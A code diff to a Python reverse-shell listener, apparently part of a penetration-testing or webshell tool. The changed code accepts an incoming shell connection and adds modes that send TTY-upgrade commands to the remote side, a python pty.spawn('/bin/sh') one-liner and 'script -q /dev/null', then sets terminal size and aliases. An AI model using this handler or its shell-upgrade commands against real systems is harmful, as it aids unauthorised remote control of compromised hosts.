@@ -3,7 +3,6 @@ import tty
 import termios
 from os import popen
 import sys
-# from sys import stdin, stdout, stderr, __stdin__, __stdout__, __stderr__
 from threading import Thread
 from time import sleep
 from libs.app import gget
@@ -98,13 +97,13 @@ def input_deamon(talk):
             break
 
 
-def main(port):
+def main(port, mode: bool):
     global CONN, CONNECTED
     init()
     CONN = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     CONN.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     CONN.settimeout(30.0)
-    reset = True
+    set_size = True
     try:
         CONN.bind(('0.0.0.0', port))
         CONN.listen(1)
@@ -115,20 +114,22 @@ def main(port):
         term = popen('printf $TERM').read()
     except Exception:
         term = "bomb"
-        reset = False
+        set_size = False
     try:
         talk, addr = CONN.accept()
         CONNECTED = 1
         stdprint("Connect from %s.\n" % addr[0])
         t = Thread(target=recv_daemon, args=(talk, ))
         t.start()
-        stdprint("step 1 !")
         t = Thread(target=input_deamon, args=(talk, ))
         t.start()
-        stdprint("step 2 !")
+        if (mode == 1):
+            talk.send(bytes("""python -c "__import__('pty').spawn('/bin/sh')" && exit\n""", encoding='utf-8'))
+        elif (mode == 2):
+            talk.send(bytes("""script -q /dev/null && exit\n""", encoding='utf-8'))
         talk.send(bytes("""alias ls='ls --color=auto'\n""", encoding='utf-8'))
         talk.send(bytes("""alias grep='grep --color=auto'\n""", encoding='utf-8'))
-        if (reset):
+        if (set_size):
             talk.send(bytes("""stty rows %s columns %s\n""" %
                             (rows, columns), encoding='utf-8'))
         talk.send(bytes("""export TERM=%s\n""" % term, encoding='utf-8'))
